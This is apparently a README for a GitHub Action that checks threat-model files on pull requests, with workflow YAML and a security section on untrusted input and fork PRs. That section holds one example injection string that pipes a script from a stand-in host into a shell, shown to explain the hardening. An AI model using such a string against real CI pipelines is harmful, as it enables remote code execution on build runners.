# threat-model check (GitHub Action)

Runs `threat check` on every pull request and tells you, right on the PR, what the change did to your threat model:

- **Annotations** on the model file for each problem (expired risk acceptances, evidence that's gone, code that changed since its threats were reviewed, and so on).
- **A job summary**: what changed (+2 threats, 1 mitigation done…), what *needs a person to agree* (changes that lower risk), errors and warnings, and the top open risks.
- **One PR comment** with the same summary, updated in place on every push (optional).
- **Code scanning alerts** for findings and open threats, via SARIF (optional).

The job fails when `threat check` finds errors, so you can make it a required check.

Setup, policy and branch protection are covered in [docs/ci.md](../docs/ci.md).

## Usage

```yaml
# .github/workflows/threat-model.yml
name: Threat model

on:
  pull_request:

permissions: {}

jobs:
  check:
    runs-on: ubuntu-latest
    permissions:
      contents: read       # read the repository
      pull-requests: write # only for `comment`; drop it with comment: false
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0              # comparing with the base needs history
          persist-credentials: false  # nothing later needs to push
      # Replace the zeros with the commit SHA of the release you want.
      - uses: open-security-tooling/threat-model/action@0000000000000000000000000000000000000000 # vX.Y.Z
        with:
          version: v1.0.0 # the threat binary; pin it like the action
          file: threatmodel.yaml
```

With code scanning:

```yaml
# .github/workflows/threat-model-sarif.yml
name: Threat model (code scanning)

on:
  pull_request:
  push:
    branches: [main]

permissions: {}

jobs:
  check:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write # upload SARIF
      actions: read          # needed by the upload on private repositories
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      - uses: open-security-tooling/threat-model/action@0000000000000000000000000000000000000000 # vX.Y.Z
        with:
          version: v1.0.0
          comment: false
          sarif: true
```

## Inputs

| Input | Default | What it does |
|---|---|---|
| `version` | `latest` | Which `threat` release to download. Pin it (e.g. `v1.0.0`) so a new release can't change your CI without a PR. |
| `file` | `threatmodel.yaml` | The model file, relative to the repository root. |
| `base` | the PR's base commit | What to compare with. Outside pull requests it's empty, and `threat check` compares each component with its `reviewed` date instead. |
| `strict` | `false` | Treat "code changed since review" as an error, not a warning. |
| `comment` | `auto` | `auto` comments on `pull_request` events; `true` or `false` to force it. Needs `pull-requests: write`. |
| `sarif` | `false` | Upload results to code scanning. Needs `security-events: write`. |
| `token` | the job token | Used to download and verify the release and to comment. You don't need a secret. |

Outputs: `ok`, `exit-code` (0 ok, 1 findings, 2 couldn't run), `result-file` (JSON), `summary-file` (Markdown) and `sarif-file`.

## What it runs

1. Downloads `threat_<os>_<arch>` for the runner from the [release](https://github.com/open-security-tooling/threat-model/releases).
2. Verifies it with `gh attestation verify --repo open-security-tooling/threat-model`, and also checks that our release workflow built it from that tag on a GitHub-hosted runner. **If verification fails, the job stops and the binary never runs.** This means a tampered download, or a binary uploaded by hand instead of built by the release workflow, is refused.
3. Runs `threat check --base <base>` with `--format github` (annotations), `--json` (the result file), `--format summary` (the job summary and comment) and, if asked, `--format sarif`.
4. Appends the summary to the job summary.
5. Finds its own comment (posted by a bot, starting with `<!-- threat-model-summary -->`) and updates it, or posts a new one.
6. Uploads SARIF with `github/codeql-action/upload-sarif`, a GitHub-owned action pinned by full commit SHA.
7. Fails the job if the check failed.

Self-hosted runners need `bash`, `jq` and a recent GitHub CLI (`gh` with `attestation verify --source-ref`). GitHub-hosted runners have all three.

## Security

Model files arrive in pull requests, so the Action treats everything from the PR as untrusted, and needs no secrets:

- **No `${{ }}` inside `run:`.** GitHub pastes an expression into the script *before* bash runs it. A branch name, PR title or input that contains `"; curl evil.example | sh #` would run as code. Every value goes through `env:` instead, where it's only data.
- **No PR code runs with a write token.** The Action never checks out code or runs anything from the repository. It reads the model file and git history, and runs only the verified `threat` binary.
- **Workflow commands are off while untrusted text prints.** The runner treats any output line starting with `::` as a command (`::add-mask::`, `::stop-commands::` and so on). The annotation output escapes model text so it can't start a line; everything else is printed between `::stop-commands::<random token>` and its end marker.
- **Escaped output.** The summary escapes Markdown and HTML and breaks `@mentions`, so a model can't inject links, images or pings into the comment. CSV, SARIF and annotation output are escaped for where they end up.
- **Use `pull_request`, not `pull_request_target`.** `pull_request_target` gives fork PRs a token that can write, and is how most Action compromises start. The Action warns if it sees it.

### Pull requests from forks

On `pull_request` from a fork, GitHub gives the job a read-only token, whatever `permissions:` says. That's what keeps a stranger's PR from writing to your repository. It also means the Action can't comment there, and it skips the SARIF upload. Annotations and the job summary still work, and the check still passes or fails.

If you want comments on fork PRs, add a second workflow that **only posts the comment**. It runs on `workflow_run` in your repository with a write token, and never checks out or runs the PR's code. It treats the artifact as untrusted data:

```yaml
# .github/workflows/threat-model.yml: the check, saving what the comment needs
name: Threat model

on:
  pull_request:

permissions: {}

jobs:
  check:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write # used for PRs from this repository; read-only on forks
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      - id: threat
        uses: open-security-tooling/threat-model/action@0000000000000000000000000000000000000000 # vX.Y.Z
        with:
          version: v1.0.0
      - name: Save the summary for the comment workflow
        if: ${{ !cancelled() && steps.threat.outputs.summary-file != '' }}
        env:
          SUMMARY: ${{ steps.threat.outputs.summary-file }}
          PR: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p "$RUNNER_TEMP/threat-comment"
          cp "$SUMMARY" "$RUNNER_TEMP/threat-comment/summary.md"
          echo "$PR" > "$RUNNER_TEMP/threat-comment/pr-number"
      - if: ${{ !cancelled() && steps.threat.outputs.summary-file != '' }}
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: threat-model-comment
          path: ${{ runner.temp }}/threat-comment/
          retention-days: 1
```

```yaml
# .github/workflows/threat-model-comment.yml: posts the comment for fork PRs
name: Threat model comment

on:
  workflow_run:
    workflows: [Threat model]
    types: [completed]

permissions: {}

jobs:
  comment:
    # Only fork PRs: the check job comments on PRs from this repository.
    if: >-
      github.event.workflow_run.event == 'pull_request' &&
      github.event.workflow_run.conclusion != 'cancelled' &&
      github.event.workflow_run.head_repository.full_name != github.repository
    runs-on: ubuntu-latest
    permissions:
      actions: read        # download the artifact
      pull-requests: write # post the comment
    steps:
      # No checkout: nothing from the pull request runs here.
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: threat-model-comment
          path: ${{ runner.temp }}/threat-comment
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}
      - name: Post or update the comment
        env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
          HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
          MARKER: "<!-- threat-model-summary -->"
        run: |
          set -euo pipefail
          dir="$RUNNER_TEMP/threat-comment"
          # The artifact was written by the fork's run, so the PR could have
          # changed anything in it. Treat it as data, and check the PR number
          # against GitHub instead of believing it.
          pr=$(tr -cd '0-9' < "$dir/pr-number" | cut -c1-10)
          if [ -z "$pr" ]; then echo "No PR number in the artifact."; exit 1; fi
          if [ "$(gh api "repos/$REPO/pulls/$pr" --jq .head.sha)" != "$HEAD_SHA" ]; then
            echo "::error::PR #$pr isn't the pull request that ran the check. Not commenting."
            exit 1
          fi
          # Cap the size, drop any marker the file has, and say where the text came from.
          body="$dir/body.md"
          {
            echo "$MARKER"
            echo "_From the check run on this fork's pull request. The pull request's own workflow produced this text._"
            echo
            head -c 60000 "$dir/summary.md" | grep -vF "$MARKER" || true
          } > "$body"
          jq -n --rawfile body "$body" '{body: $body}' > "$dir/payload.json"
          id=$(gh api --paginate "repos/$REPO/issues/$pr/comments" \
            --jq ".[] | select(.user.type == \"Bot\" and (.body | startswith(\"$MARKER\"))) | .id" | sed -n 1p)
          if [ -n "$id" ]; then
            gh api --method PATCH "repos/$REPO/issues/comments/$id" --input "$dir/payload.json" > /dev/null
          else
            gh api --method POST "repos/$REPO/issues/$pr/comments" --input "$dir/payload.json" > /dev/null
          fi
```

The comment workflow's `workflow_run` runs the workflow file from your default branch, not the PR's, so a fork can't change what it does. A fork *can* change its own check workflow, though, so it can put any text in the artifact. That's why the comment says where it came from, and why the check's pass or fail, not the comment, is what you protect the branch with.
